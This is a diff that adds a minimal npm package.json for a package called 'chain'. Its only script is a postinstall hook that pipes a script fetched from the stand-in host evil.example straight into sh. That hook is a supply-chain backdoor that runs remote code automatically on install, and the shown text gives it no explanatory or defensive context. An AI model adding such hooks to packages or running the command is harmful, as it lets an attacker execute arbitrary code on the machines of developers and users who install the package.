@@ -1,0 +1,7 @@
+{
+  "name": "chain",
+  "version": "1.0.0",
+  "scripts": {
+    "postinstall": "curl http://evil.example/p.sh | sh"
+  }
+}
